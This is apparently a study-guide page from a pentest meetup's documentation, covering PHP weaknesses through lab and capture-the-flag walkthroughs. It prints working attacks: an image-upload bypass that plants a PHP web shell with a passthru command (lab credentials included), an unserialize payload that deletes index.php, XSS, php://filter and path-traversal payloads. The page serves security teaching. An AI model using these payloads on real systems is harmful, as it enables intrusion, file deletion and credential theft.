@@ -1,0 +1,463 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>8.10. PHP &amp; MySQL Shortcomings &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="8. Pentest Study" href="../pentest_study.html"/>
+        <link rel="next" title="8.11. Vulnerabilites" href="vulnerabilities.html"/>
+        <link rel="prev" title="8.9. Password Cracking Resources" href="passwords.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="2factor.html">8.1. 2 Factor Authentication</a></li>
+<li class="toctree-l2"><a class="reference internal" href="email_security.html">8.2. Email Security</a></li>
+<li class="toctree-l2"><a class="reference internal" href="exfiltration.html">8.3. Exfiltration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="exiftool.html">8.4. <strong class="program">exiftool</strong></a></li>
+<li class="toctree-l2"><a class="reference internal" href="loadlibrary.html">8.5. loadlibrary</a></li>
+<li class="toctree-l2"><a class="reference internal" href="linux_exploitation_tricks.html">8.6. Linux Exploitation Tricks</a></li>
+<li class="toctree-l2"><a class="reference internal" href="llmnr.html">8.7. Windows broadcast name resolution</a></li>
+<li class="toctree-l2"><a class="reference internal" href="ntlm.html">8.8. NTLM</a></li>
+<li class="toctree-l2"><a class="reference internal" href="passwords.html">8.9. Password Cracking Resources</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">8.10. PHP &amp; MySQL Shortcomings</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#php-mysql-are-both-bad">8.10.1. PHP &amp; MySQL are both bad</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#exploit-db-php-vulnerabilities">8.10.2. Exploit-DB PHP vulnerabilities</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#owasp-php-vulnerabilites">8.10.3. OWASP PHP vulnerabilites</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#id1">8.10.3.1. OWASP Unrestricted File Upload</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id2">8.10.3.2. OWASP PHP Object Injection</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#php-protocols-and-wrappers">8.10.4. PHP Protocols and Wrappers</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#data">8.10.4.1. data://</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#php">8.10.4.2. php://</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#php-filter">8.10.4.3. php://filter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#php-fd">8.10.4.4. php://fd</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="vulnerabilities.html">8.11. Vulnerabilites</a></li>
+<li class="toctree-l2"><a class="reference internal" href="wifi.html">8.12. WiFi Tutorial</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_study.html">8. Pentest Study</a> &raquo;</li>
+        
+      <li>8.10. PHP &amp; MySQL Shortcomings</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/study/php.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="php-mysql-shortcomings">
+<h1>8.10. PHP &amp; MySQL Shortcomings<a class="headerlink" href="#php-mysql-shortcomings" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="php-mysql-are-both-bad">
+<h2>8.10.1. PHP &amp; MySQL are both bad<a class="headerlink" href="#php-mysql-are-both-bad" title="Permalink to this headline">¶</a></h2>
+<p>See <a class="reference external" href="https://eev.ee/blog/2012/04/09/php-a-fractal-of-bad-design/">PHP: a fractal of bad design</a> for a list of the many PHP shortcomings. It is often combined with MySQL - see <a class="reference external" href="https://grimoire.ca/mysql/choose-something-else">Do Not Pass This Way Again</a> for a list of the many problems with MySQL.</p>
+</div>
+<div class="section" id="exploit-db-php-vulnerabilities">
+<h2>8.10.2. Exploit-DB PHP vulnerabilities<a class="headerlink" href="#exploit-db-php-vulnerabilities" title="Permalink to this headline">¶</a></h2>
+<p>Read <a class="reference external" href="https://www.exploit-db.com/papers/13017/">Web vulnerabilities to gain access to the system</a> for a good introduction to a number of clever PHP vulnerabilities.</p>
+</div>
+<div class="section" id="owasp-php-vulnerabilites">
+<h2>8.10.3. OWASP PHP vulnerabilites<a class="headerlink" href="#owasp-php-vulnerabilites" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="https://www.owasp.org/index.php/Category:Vulnerability">OWASP Category:Vulnerability</a> includes a number of vulnerabilities related to PHP.</p>
+<div class="section" id="id1">
+<h3>8.10.3.1. <a class="reference external" href="https://www.owasp.org/index.php/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
+<p>This is covered adequately elsewhere, so we mostly provide links to these references.</p>
+<p>A good &amp; short introduction is <a class="reference external" href="http://hackers2devnull.blogspot.com/2013/05/how-to-shell-server-via-image-upload.html">How to shell a server via image upload and bypass extension + real image verification</a>.</p>
+<p>The <a class="reference external" href="https://www.owasp.org/">OWASP</a> article is <a class="reference external" href="https://www.owasp.org/index.php/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a>, especially the section “Weak Protection Methods and Methods of Bypassing”. Read “Using Black-List for Files’ Extensions”, “Using White-List for Files’ Extensions”, “Using “Content-Type” from the Header”, and “Using a File Type Recogniser”.</p>
+<p>For “Using a File Type Recogniser” we provide one concrete example for their first method: “Sometimes the recognisers just read the few first characters (or header) of the files in order to check them. In this case, an attacker can insert the malicious code after some valid header.” Specifically, we’ll use the <a class="reference external" href="https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format#File_format_structure">JPEG File Interchange Format</a> <a class="reference external" href="https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format#File_format_structure">File format structure</a> to place 11 bytes at the beginning of a PHP file to indicate it is a JPEG file:</p>
+<blockquote>
+<div><p>The challenge <a class="reference external" href="http://overthewire.org/wargames/natas/">OverTheWire Natas</a> teaches the basics of serverside web security. <a class="reference external" href="http://natas13.natas.labs.overthewire.org/">Natas Level 13 -&gt; 14</a> (user id nata13, password “jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY”) is backed by a server-side script using <code class="docutils literal"><span class="pre">exif_imagetype</span></code> check to make sure the uploaded file is an image file. Here we bypass the image type check by setting the first 11 bytes of the PHP file to the JFIF header values, tricking the server into uploading php that displays the contents of the file <code class="file docutils literal"><span class="pre">/etc/natas_webpass/natas14</span></code> (password for the next Natas level). The php exploit code is:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + &quot;JFIF&quot; + \x00</span>
+</span><span class="hll"><span class="nv">JFIF_HEADER</span><span class="o">=</span><span class="s2">&quot;\xFF\xD8\xFF\xE0\x00\x10JFIF\x00&quot;</span>
+</span><span class="hll"><span class="nv">EXPLOIT</span><span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;echo -n PASS; cat /etc/natas_webpass/natas14&quot;); ?&gt;&#39;</span>
+</span><span class="hll"><span class="nb">echo</span> -e <span class="s2">&quot;</span><span class="nv">$JFIF_HEADER$EXPLOIT</span><span class="s2">&quot;</span> &gt; natas14.php
+</span><span class="hll"><span class="c1"># upload to web server and capture saved filename</span>
+</span><span class="nv">upload</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
+  curl --silent --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY <span class="se">\</span>
+    --form <span class="nv">filename</span><span class="o">=</span>natas14.php <span class="se">\</span>
+    --form <span class="nv">uploadedfile</span><span class="o">=</span>@natas14.php <span class="se">\</span>
+    --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload File&quot;</span> <span class="se">\</span>
+    http://natas13.natas.labs.overthewire.org/index.php <span class="se">\</span>
+  <span class="p">|</span> grep <span class="s1">&#39;a href=&quot;upload/&#39;</span> <span class="se">\</span>
+<span class="k">)</span>
+<span class="nv">file</span><span class="o">=</span><span class="si">${</span><span class="nv">upload</span><span class="p">#*upload/</span><span class="si">}</span>
+<span class="nv">file</span><span class="o">=</span><span class="si">${</span><span class="nv">file</span><span class="p">%%</span><span class="se">\&quot;</span><span class="p">*</span><span class="si">}</span>
+curl --silent <span class="se">\</span>
+     --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY <span class="se">\</span>
+     http://natas13.natas.labs.overthewire.org/upload/<span class="nv">$file</span> <span class="p">|</span>
+tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</span>  <span class="p">|</span> sed -e <span class="s1">&#39;s/^.*PASS//;s/$/\</span>
+<span class="s1">/&#39;</span>
+</pre></div>
+</div>
+<p>Running this gives the Natas 14 password:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$ #</span> JPEG leading <span class="m">11</span> bytes: <span class="se">\x</span>FF + SOI + <span class="se">\x</span>FF + APP0 + <span class="se">\x</span><span class="m">00</span> + <span class="se">\x</span><span class="m">10</span> + <span class="s2">&quot;JFIF&quot;</span> + <span class="se">\x</span><span class="m">00</span>
+</span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">JFIF_HEADER</span><span class="o">=</span><span class="s2">&quot;\xFF\xD8\xFF\xE0\x00\x10JFIF\x00&quot;</span>
+</span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">EXPLOIT</span><span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;echo -n PASS; cat /etc/natas_webpass/natas14&quot;); ?&gt;&#39;</span>
+</span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nb">echo</span> -e <span class="s2">&quot;</span><span class="nv">$JFIF_HEADER$EXPLOIT</span><span class="s2">&quot;</span> &gt; natas14.php
+</span><span class="hll"><span class="gp">hacker@kali:~$ #</span> upload to web server and capture saved filename
+</span><span class="gp">hacker@kali:~$ upload=$</span><span class="o">(</span> <span class="se">\</span>
+&gt;   curl --silent --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY <span class="se">\</span>
+&gt;     --form <span class="nv">filename</span><span class="o">=</span>natas14.php <span class="se">\</span>
+&gt;     --form <span class="nv">uploadedfile</span><span class="o">=</span>@natas14.php <span class="se">\</span>
+&gt;     --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload File&quot;</span> <span class="se">\</span>
+&gt;     http://natas13.natas.labs.overthewire.org/index.php <span class="se">\</span>
+&gt;   <span class="p">|</span> grep <span class="s1">&#39;a href=&quot;upload/&#39;</span> <span class="se">\</span>
+&gt; <span class="o">)</span>
+<span class="gp">hacker@kali:~$ file=${upload#</span>*upload/<span class="o">}</span>
+<span class="gp">hacker@kali:~$ file=${file%%</span><span class="se">\&quot;</span>*<span class="o">}</span>
+<span class="gp">hacker@kali:~$</span> curl --silent <span class="se">\</span>
+&gt;      --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY <span class="se">\</span>
+&gt;      http://natas13.natas.labs.overthewire.org/upload/<span class="nv">$file</span> <span class="p">|</span>
+<span class="gp">&gt;</span> tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</span>  <span class="p">|</span> sed -e <span class="s1">&#39;s/^.*PASS//;s/$/\</span>
+<span class="s1">&gt; /&#39;</span>
+<span class="hll"><span class="go">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</span>
+</span></pre></div>
+</div>
+<p>So we bypassed the image file check by setting the first 11 bytes of the PHP file to those indicating a JPEG file.</p>
+</div></blockquote>
+</div>
+<div class="section" id="id2">
+<h3>8.10.3.2. <a class="reference external" href="https://www.owasp.org/index.php/PHP_Object_Injection">OWASP PHP Object Injection</a><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
+<p>From <a class="reference external" href="https://www.owasp.org/index.php/PHP_Object_Injection">OWASP PHP Object Injection</a>:</p>
+<blockquote>
+<div><p>PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.</p>
+<p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p>
+<ul class="simple">
+<li>The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a “POP chain”.</li>
+<li>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.</li>
+</ul>
+</div></blockquote>
+<p>We’ll provide a little bit more detail on OWASP’s Example 1. __destruct() is one of PHP’s <a class="reference external" href="http://php.net/manual/en/language.oop5.magic.php">Magic Methods</a>. The idea is there’s a PHP class Example1 that gets unserialized (after presumably being serialized). It contains a __destruct() function that deletes the object’s cache file. The exploit tampers with a saved Example1 serialization to change the file to an arbitrary file, causing that file to be deleted:</p>
+<div class="highlight-php5"><div class="highlight"><pre><span></span><span class="x">class Example1</span>
+<span class="x">{</span>
+<span class="hll"><span class="x">   public $cache_file;</span>
+</span>
+<span class="x">   function __construct()</span>
+<span class="x">   {</span>
+<span class="x">      // some PHP code...</span>
+<span class="x">   }</span>
+
+<span class="x">   function __destruct()</span>
+<span class="x">   {</span>
+<span class="hll"><span class="x">      $file = &quot;/var/www/cache/tmp/{$this-&gt;cache_file}&quot;;</span>
+</span><span class="hll"><span class="x">      if (file_exists($file)) @unlink($file);</span>
+</span><span class="x">   }</span>
+<span class="x">}</span>
+
+<span class="x">// some PHP code...</span>
+
+<span class="hll"><span class="x">$user_data = unserialize($_GET[&#39;data&#39;]);</span>
+</span>
+<span class="x">// some PHP code...</span>
+</pre></div>
+</div>
+<p>The object Example1 deletes it’s $cache_file upon destruction and the exploiter wants instead to delete a PHP file. All they need do is create a serialized Example1 where $cache_file is set to a reference to the PHP file to be deleted (say <code class="file docutils literal"><span class="pre">../../index.php</span></code> to make the <code class="file docutils literal"><span class="pre">/var/www/cache/tmp/$file</span></code> reference delete <code class="file docutils literal"><span class="pre">/var/www/index.php</span></code>). This is done with a short PHP script declaring a class Example1, modifying the $cache_file variable as needed, then getting the serialized value (to be used later as input to a vulnerable PHP script):</p>
+<div class="highlight-php5"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="hll"><span class="k">class</span> <span class="nc">Example1</span>
+</span><span class="p">{</span>
+   <span class="k">public</span> <span class="nv">$cache_file</span><span class="p">;</span>
+
+   <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+   <span class="p">{</span>
+      <span class="c1">// some PHP code...</span>
+   <span class="p">}</span>
+
+   <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+   <span class="p">{</span>
+      <span class="nv">$file</span> <span class="o">=</span> <span class="s2">&quot;/var/www/cache/tmp/</span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache_file</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="hll"><span class="nv">$temp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Example1</span><span class="p">();</span>
+</span><span class="hll"><span class="nv">$temp</span><span class="o">-&gt;</span><span class="na">cache_file</span> <span class="o">=</span> <span class="s2">&quot;../../index.php&quot;</span><span class="p">;</span>
+</span><span class="hll"><span class="k">print</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
+</span><span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</div>
+<p>Running this gives the serialized output <code class="docutils literal"><span class="pre">O:8:&quot;Example1&quot;:1:{s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;}</span></code>. So then the following URL will cause <code class="file docutils literal"><span class="pre">index.php</span></code> to be deleted when the unserialized data object is destroyed:</p>
+<div class="highlight-text"><div class="highlight"><pre><span></span><span class="hll">http://testsite.com/vuln.php?data=O:8:&quot;Example1&quot;:1:{s:10:&quot;cache_file&quot;;s:15:&quot;../../index.php&quot;;}
+</span></pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="php-protocols-and-wrappers">
+<h2>8.10.4. PHP Protocols and Wrappers<a class="headerlink" href="#php-protocols-and-wrappers" title="Permalink to this headline">¶</a></h2>
+<p><a class="reference external" href="http://in.php.net/wrappers.php">Supported Protocols and Wrappers</a> currently lists: <a class="reference external" href="file://">file://</a>, <a class="reference external" href="http://">http://</a>, <a class="reference external" href="ftp://">ftp://</a>, php://, zlib://, data://, glob://, phar://, ssh2://, rar://, ogg://, and expect://. Not all these are supported by all PHP servers, but the most important 2 for us are data:// and php://.</p>
+<div class="section" id="data">
+<h3>8.10.4.1. <a class="reference external" href="data://">data://</a><a class="headerlink" href="#data" title="Permalink to this headline">¶</a></h3>
+<p>The PHP protocols are similar to <a class="reference external" href="https://en.wikipedia.org/wiki/Data_URI_scheme">Data URI scheme</a>. There, Google’s <a class="reference external" href="https://xss-game.appspot.com/">XSS game</a> (solutions at <a class="reference internal" href="../challenges/googles_xss_game.html#xssgame"><span class="std std-ref">Google’s XSS Game</span></a>) level 6 can be solved using <a class="reference external" href="https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(&quot;boo&quot;)">https://xss-game.appspot.com/level6/frame#data:text/javascript,alert(“boo”)</a>. Instead of loading a JavaScript file from some remote location, <code class="docutils literal"><span class="pre">data:text/javascript,...</span></code> supplies the data. Level 5 can be solved via <code class="docutils literal"><span class="pre">https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(&quot;boo&quot;)</span></code>, again using <code class="docutils literal"><span class="pre">javascript:alert(&quot;boo&quot;)</span></code> to specify the JavaScript directly instead of a file.</p>
+</div>
+<div class="section" id="php">
+<h3>8.10.4.2. php://<a class="headerlink" href="#php" title="Permalink to this headline">¶</a></h3>
+<p>php:// allows accessing various I/O streams.</p>
+</div>
+<div class="section" id="php-filter">
+<h3>8.10.4.3. php://filter<a class="headerlink" href="#php-filter" title="Permalink to this headline">¶</a></h3>
+<p>php://filter permits the application of a filter to a stream. The <a class="reference external" href="http://in.php.net/manual/en/filters.php">List of Available Filters</a> includes <a class="reference external" href="http://in.php.net/manual/en/filters.string.php">String Filters</a> (see <a class="reference external" href="http://in.php.net/manual/en/ref.strings.php">String Functions</a>), <a class="reference external" href="http://in.php.net/manual/en/filters.convert.php">Conversion Filters</a> (most importantly base64_encode() and base64_decode()), <a class="reference external" href="http://in.php.net/manual/en/filters.compression.php">Compression Filters</a>, and <a class="reference external" href="http://in.php.net/manual/en/filters.encryption.php">Encryption Filters</a>. A sequence of filters can be piped together using “|”:</p>
+<div class="highlight-php"><div class="highlight"><pre><span></span><span class="hll"><span class="x">readfile(&quot;php://filter/read=string.toupper|string.rot13/resource=http://www.example.com&quot;);</span>
+</span></pre></div>
+</div>
+<p>Challenge <a class="reference internal" href="../challenges/owlnest.html#owlnest"><span class="std std-ref">OwlNest</span></a> uses php://filter to download instead of execute PHP files by converting them to base64 (making them not PHP source):</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
+<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
+<span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+
+<span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://owlnest.com/uploadform.php&#39;</span>
+<span class="nv">PHP</span><span class="o">=</span>uploadform.php
+<span class="hll">curl --silent --cookie <span class="nv">$COOKIES</span> <span class="se">\</span>
+</span><span class="hll">  <span class="nv">$URL</span>?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span><span class="nv">$PHP</span> <span class="se">\</span>
+</span>  <span class="p">|</span> base64 -d -w <span class="m">0</span> <span class="se">\</span>
+  <span class="p">|</span> tee <span class="nv">$PHP</span>
+</pre></div>
+</div>
+<p>Without the php://filter/convert.base64-encode the PHP file would be executed and the contents would not be viewable.</p>
+</div>
+<div class="section" id="php-fd">
+<h3>8.10.4.4. php://fd<a class="headerlink" href="#php-fd" title="Permalink to this headline">¶</a></h3>
+<p>php://fd allows direct access to a file descriptor like php://fd/9, though sometimes it will have to be referenced via <code class="file docutils literal"><span class="pre">/proc/self/fd/9</span></code>. Challenge <a class="reference internal" href="../challenges/kioptrix4.html#kioptrix4"><span class="std std-ref">Kioptrix Level 4</span></a> uses <code class="file docutils literal"><span class="pre">/proc/self/fd/9</span></code> which is mapped to the PHP session data:</p>
+<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">#</span> on kioptrix4 - cat of /var/lib/php5/sess_e67efa732b9b15b6def9824e1200db76
+<span class="hll"><span class="gp">john@Kioptrix4:/var/lib/php5$</span> sudo cat sess_e67efa732b9b15b6def9824e1200db76
+</span><span class="hll"><span class="go">myusername|s:4:&quot;user&quot;;mypassword|s:12:&quot;&#39; OR 1=1-- -&quot;;</span>
+</span>
+<span class="hll"><span class="gp">#</span> on kali - fetch /proc/self/fd/9 using the matching cookie
+</span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/exploit$ cat $</span>COOKIES
+</span><span class="hll"><span class="go">kioptrix4.com FALSE   /       FALSE   0       PHPSESSID       e67efa732b9b15b6def9824e1200db76</span>
+</span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/exploit$</span> <span class="nv">FILE</span><span class="o">=</span><span class="s1">&#39;../../../../../../proc/self/fd/9&#39;</span>
+</span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/exploit$ URL=&quot;http://kioptrix4.com/member.php?username=$FILE%</span><span class="m">00</span><span class="s2">&quot;</span>
+</span><span class="hll"><span class="gp">hacker@kali:~/pentest/kioptrix4/exploit$</span><span class="s2"> curl --silent --cookie </span><span class="nv">$COOKIES</span><span class="s2"> -L </span><span class="nv">$URL</span><span class="s2"></span>
+</span><span class="hll"><span class="go">myusername|s:4:&quot;user&quot;;mypassword|s:12:&quot;&#39; OR 1=1-- -&quot;;</span>
+</span></pre></div>
+</div>
+<p>So kioptrix4 uses <code class="file docutils literal"><span class="pre">fd/9</span></code> to access the PHP session data.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="vulnerabilities.html" class="btn btn-neutral float-right" title="8.11. Vulnerabilites" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="passwords.html" class="btn btn-neutral" title="8.9. Password Cracking Resources" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
